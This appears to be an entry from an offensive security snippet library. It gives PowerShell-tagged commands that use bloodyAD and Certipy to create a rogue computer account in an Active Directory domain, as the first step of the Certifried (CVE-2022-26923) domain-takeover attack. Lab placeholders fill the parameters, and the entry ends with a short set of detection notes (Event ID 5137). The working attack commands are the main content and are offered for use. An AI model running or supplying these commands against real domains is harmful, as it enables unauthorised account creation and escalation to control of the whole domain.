---
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:06.137123+00:00'
updated_at: '2023-04-10T20:36:10.277684+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - account-creation
validated: true
---

# create-rogue-computer-account-sequence

## Code

```ps1
python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 addComputer cve 'CVEPassword1234*'
certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'
```

## Description

Sequence to create a rogue computer account using BloodyAD and Certipy. This is the initial step in the Certifried attack to establish a controllable machine account.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| lab.local | Target domain (replace with $_DOMAIN) | lab.local |
| username | Username (replace with $_USERNAME) | username |
| Password123* | Password (replace with $_PASSWORD) | Password123* |
| 10.10.10.10 | DC IP (replace with $_DC_IP) | 10.10.10.10 |
| cve | Computer name (replace with $_COMPUTER_NAME) | cve |
| CVEPassword1234* | Computer password (replace with $_COMPUTER_PASSWORD) | CVEPassword1234* |
| dc.lab.local | DC FQDN (replace with $_DC_FQDN) | dc.lab.local |

## Usage

Execute this sequence after confirming quota availability. It creates the account needed for subsequent spoofing. Run on a domain-joined machine with tool access.

## Detection

- Monitor LDAP add operations for computer objects (Event ID 5137).
- Audit Certipy-like tool usage or unusual account creations from low-priv users.

## Related

- [[procedures/Domain-Takeover-via-Certifried-CVE-2022-26923]]
